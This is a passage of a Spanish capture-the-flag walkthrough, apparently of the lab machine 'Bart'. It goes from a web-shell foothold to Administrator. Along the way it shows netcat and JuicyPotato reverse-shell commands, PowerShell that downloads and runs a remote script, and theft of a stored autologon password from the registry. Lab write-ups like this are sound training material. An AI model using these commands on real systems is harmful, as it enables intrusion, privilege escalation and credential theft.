re><p id="12c090fe-8641-475c-8fbe-9a428e75770c" class="">
</p><h3 id="65575762-48de-48f3-a977-fcd4ceadae7e" class="">Ponemos esto en nuestra máquina, pero antes debemos poner nuestra máquina a la escucha y así tenemos una Reverse Shell</h3><p id="3292a83c-7c97-4401-81f6-77d5c73520fd" class="">
</p><pre id="483545a6-d571-48a1-9de1-0bae5da220a4" class="code"><code>┌─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.145] from (UNKNOWN) [10.129.220.209] 53517
id
whoami
nt authority\iusr
PS C:\inetpub\wwwroot\internal-01\log&gt;</code></pre><p id="1e5e1738-738c-45c3-bc78-eb5ad8830125" class="">
</p><h3 id="9e15d668-ac2a-4caa-a137-a20bc9045b5e" class="">Ahora que tenemos la Reverse Shell vamos a tratar de escalar privilegios</h3><p id="a920e176-36aa-4b7c-be0e-51c4d2284366" class="">
</p><pre id="3086e40b-98e9-4126-ad2f-c582ac7de27d" class="code"><code>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
PS C:\users&gt;</code></pre><p id="927456b4-498f-4313-aa38-cf9f6739c182" class="">
</p><h3 id="70b0e9c7-377e-498a-88ed-1161f5a96a2c" class="">Cómo tiene el <mark class="highlight-red">SeImpersonatePrivilege</mark> podríamos intentar escalar con JuicyPotato, pero en este caso vamos a realizar la escalada de otra manera</h3><p id="bd3cea80-a1b9-49d7-8438-555be1c1bb57" class="">
</p><pre id="742e29fd-d8db-46b3-b663-600502b72990" class="code"><code>## elevar privilegios con juicyPotato
   - ejecutar comando: whoami /priv y nesecitamos tener SeImpersonatePrivilege
   - creamos un bat para que ejecute el comando nc.exe -e cmd.exe 10.10.14.145 4444
   - jp.exe -p C:\Windows\Temp\abel\shell.bat -l 1337 -t *
   - dejar en escucha con netcat


   # otra forma
   - .\jp.exe -p C:\Windows\System32\cmd.exe -a &#x27;/c C:\Windows\temp\nc.exe -e cmd.exe 10.10.14.75 4444&#x27; -l 1337 -t *</code></pre><p id="29a128c8-b6d7-4a0f-a72f-8dc9307f67fc" class="">
</p><h3 id="e8666a99-4df7-4357-abcd-bd7c9616e827" class="">Al revisar la arquitectura de la máquina vemos que los procesos no están corriendo en 64 bits</h3><p id="bb05f78f-3d2a-468f-ae56-edaf1edd74ea" class="">
</p><pre id="c84bd66e-463c-46e8-951b-f6ef06d0f483" class="code"><code>[Environment]::Is64bitOperatingSystem
True
[Environment]::Is64bitProcess
False</code></pre><p id="33ae511c-12b1-4a34-8d18-e354a95cad22" class="">
</p><h3 id="268772c5-a7de-481d-a797-f33b5d9639b9" class="">Así que debemos migrar para que el proceso corra en 64 bits y Vamos a realizar una reverse shell con<mark class="highlight-red"> Invoke-PowerShellTcp.ps1</mark>, para esto necesitamos modificar el archivo y poner en la ultima linea la reverse shell que necesitamos </h3><p id="b7788fd3-e848-4f9c-82ea-7bcbbc790c7e" class="">
</p><pre id="c33690bd-8bea-4781-8a68-58657486cfb8" class="code"><code>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.117 -Port 4444</code></pre><p id="9a4f0d10-44c3-4ab6-ba1f-cf77e80760da" class="">
</p><h3 id="664ec105-9782-4215-9674-21e16e30a5eb" class="">Luego nos creamos un servidor http con python3 en este directorio </h3><p id="20f9e390-3bb3-4fea-9709-0a6fc9abc283" class="">
</p><pre id="af36f4c2-1f4c-420d-b88d-2daa9f926eda" class="code"><code>┌─[root@parrot]─[/mnt/angussMoody/Scripts/Windows]
└──╼ #python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre><p id="8353ab14-c405-4ff4-a3ec-a19b8c70c83f" class="">
</p><h3 id="b9102329-1628-4b20-aea7-475e16f6e33d" class="">Y ahora vamos a hacer uso de powershell para decirle a nuestra máquina victima que nos interprete este archivo desde la Ruta del powershell para que nos tome el proceso en 64 bits </h3><p id="f91319ce-ad6d-4659-8cc0-4ddeb34f2ded" class="">
</p><pre id="c2b7a346-cea1-4491-87bc-f6dafa345021" class="code"><code>PS C:\Windows\Sysnative\WindowsPowerShell\v1.0&gt; powershell.exe IEX(New-Object Net.WebClient).downloadString(&#x27;http://10.10.14.117/Invoke-PowerShellTcp.ps1&#x27;)</code></pre><p id="b2f51bb2-3b49-48f5-b6af-c7fd77ca835e" class="">
</p><h3 id="f817c28c-cc7f-4129-aac0-7fcb852caf15" class="">Pero antes de ejecutar esto ponemos nuestra máquina a la escucha en el puerto que pusimos en el Invoke-PowerShellTcp.ps1</h3><p id="b2c1be31-22c4-4dad-b3f5-3d7152f7135d" class="">
</p><pre id="c598846b-af29-4d0d-a342-4e89f32095dc" class="code"><code>┌─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #rlwrap nc -nlvp 4444
listening on [any] 4444 ...</code></pre><p id="c5c2d981-0db3-4503-97b3-3b82bf10d462" class="">
</p><h3 id="ff0572a1-79c4-4d7a-aa3f-cb5fa675051a" class="">Desde la Reverse Shell que tenemos no nos da resultados así que debemos buscar otra forma de realizar el proceso y como ya tenemos una web shell en la máquina, vamos a realizar el proceso con cURL</h3><p id="e28f12c1-21e2-4573-83a8-a438abf47f9c" class="">
</p><pre id="1fb73565-809e-4e77-aa52-366622a62840" class="code"><code>┌─[root@parrot]─[/mnt/angussMoody]
└──╼ #curl -s &quot;http://internal-01.bart.htb/log/test.php?cmd=C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe%20IEX(New-Object%20Net.WebClient).downloadString(%27http://10.10.14.117/Invoke-PowerShellTcp.ps1%27)&quot;</code></pre><p id="31962231-3099-4b37-82c9-ca8d2be8fff7" class="">
</p><h3 id="6053b0a0-b33d-44c8-8cb2-93dbd84c1551" class="">Ahora vemos que el Proceso si está bajo 64 bits</h3><p id="0a00362e-dc5c-4b82-9cb0-a6fca74c97dc" class="">
</p><pre id="0829132a-bdd9-4b5a-9e78-437dd9e9bbb9" class="code"><code>┌─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.117] from (UNKNOWN) [10.129.228.109] 52573
Windows PowerShell running as user BART$ on BART
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

[Environment]::Is64bitOperatingSystem
True
[Environment]::Is64bitProcess
True
PS C:\inetpub\wwwroot\internal-01\log&gt;</code></pre><p id="3c3cf0e8-3d4d-40cb-8126-8426ef6f424d" class="">
</p><h3 id="1efb04ae-e049-4690-9eb4-63e17193942a" class="">Como estamos en powershell vamos a ir a la ruta de <mark class="highlight-red">HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon </mark>y buscar con <mark class="highlight-red">get-itemproperty .</mark>  contraseñas almacenadas </h3><p id="f8ba1fb1-a61d-403b-ae27-68989cb16f00" class="">
</p><pre id="bfb0c6b0-70e7-4b57-929b-54ddb71a8ee4" class="code"><code>cd HKLM:
cd &quot;SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;
get-itemproperty .


AutoRestartShell             : 1
Background                   : 0 0 0
CachedLogonsCount            : 10
DebugServerCommand           : no
DefaultDomainName            : DESKTOP-7I3S68E
DefaultUserName              : Administrator
DisableBackButton            : 1
EnableSIHostIntegration      : 1
ForceUnlockLogon             : 0
LegalNoticeCaption           : 
LegalNoticeText              : 
PasswordExpiryWarning        : 5
PowerdownAfterShutdown       : 0
PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
ReportBootOk                 : 1
Shell                        : explorer.exe
ShellCritical                : 0
ShellInfrastructure          : sihost.exe
SiHostCritical               : 0
SiHostReadyTimeOut           : 0
SiHostRestartCountLimit      : 0
SiHostRestartTimeGap         : 0
Userinit                     : C:\Windows\system32\userinit.exe,
VMApplet                     : SystemPropertiesPerformance.exe /pagefile
WinStationsDisabled          : 0
scremoveoption               : 0
DisableCAD                   : 1
LastLogOffEndTimePerfCounter : 215729203
ShutdownFlags                : 2147484203
AutoAdminLogon               : 1
DisableLockWorkstation       : 0
EnableFirstLogonAnimation    : 1
AutoLogonSID                 : S-1-5-21-988671444-1802818203-1364644418-500
LastUsedUsername             : Administrator
DefaultPassword              : 3130438f31186fbaf962f407711faddb
PSPath                       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_M
                               ACHINE\SOFTWARE\Microsoft\Windows 
                               NT\Currentversion\Winlogon
PSParentPath                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_M
                               ACHINE\SOFTWARE\Microsoft\Windows 
                               NT\Currentversion
PSChildName                  : Winlogon
PSDrive                      : HKLM
PSProvider                   : Microsoft.PowerShell.Core\Registry</code></pre><p id="29c8702f-4e56-40c9-a971-f935938c95b7" class="">
</p><h3 id="f425a10c-4a6a-417f-a711-d6992a1cf5fb" class="">Como ya tenemos el hash del Usuario administrador, vamos a crear las variables con estos datos, para que podamos ejecutar comandos como este usuario, lo primero que necesitamos es el nombre de la máquina</h3><p id="55c2b715-9a13-48a3-887c-9685543b5c89" class="">
</p><pre id="aa6949a9-202a-4a5e-9ffb-9a64361595b1" class="code"><code>Hostname
BART</code></pre><p id="ec316df1-131d-4d58-bf19-404fa52be3b8" class="">
</p><h3 id="1e511944-56d9-455e-956c-9a15e1b097f1" class="">Ahora debemos crear las variables y configurarlas para la ejecución de los comandos</h3><p id="138046b2-2e39-4935-96fe-7a6e1969893d" class="">
</p><pre id="c114cc9b-1ece-4769-b369-043fc85a0df9" class="code"><code>$username = &quot;BART\Administrator&quot;
$password = &quot;3130438f31186fbaf962f407711faddb&quot;
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr</code></pre><p id="d438dd37-6c2a-4166-912a-66fc63451027" class="">
</p><h3 id="55f88180-d3df-4ef0-891b-232efe3f6d26" class="">y por ultimo vamos a modificar nuestro Invoke-PowerShellTcp.ps1 para que nos ejecute en otro puerto para evitar inconvenientes en este caso le vamos a poner el puerto 4445 y ponemos nuestra máquina a la escucha</h3><p id="c618218e-3eef-4ac1-a9c1-f2fd89e870c1" class="">
</p><pre id="cc544c6a-8bb6-45d8-a399-fffba1f25daf" class="code"><code>┌─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #rlwrap nc -nlvp 4445</code></pre><p id="4a171d6f-2f1f-483a-8241-6407c3099c3d" class="">
</p><h3 id="b4492cf4-dbaf-4e73-bf12-c515373f28bf" class="">Ahora en la máquina victima le damos la orden para que nos ejecute un comando como administrador </h3><p id="5ea5e94c-64e4-406a-aeb4-fe6c53dbc7b1" class="">
</p><pre id="bd0090cf-a930-457f-8edc-9d86f14fa06c" class="code"><code>Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString(&#x27;http://10.10.14.117/Invoke-PowerShellTcp.ps1&#x27;) } -Credential $cred -Computer localhost
</code></pre><p id="3aa56857-850f-4ab8-baad-b7f574066447" class="">
</p><h3 id="31791bdd-9f0b-4145-ab70-5f65b89dc5ac" class="">y ya de esta manera nos devuelve una Reverse Shell como Administrator</h3><p id="7f3c1d4c-3c61-4dbd-b6af-d5d02d4f95cf" class="">
</p><pre id="bf64680f-356a-462a-8f47-103ce2fc20b8" class="code"><code>┌─[root@parrot]─[/mnt/angussMoody/Machines/Bart]
└──╼ #rlwrap nc -nlvp 4445
listening on [any] 4445 ...
connect to [10.10.14.117] from (UNKNOWN) [10.129.228.109] 54457
Windows PowerShell running as user Administrator on BART
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
bart\administrator
Hostname
BART
cd ../Desktop
dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----       11/02/2018     12:51             32 root.txt                      


PS C:\Users\Administrator\Desktop&gt;</code></pre></div></article></body></html>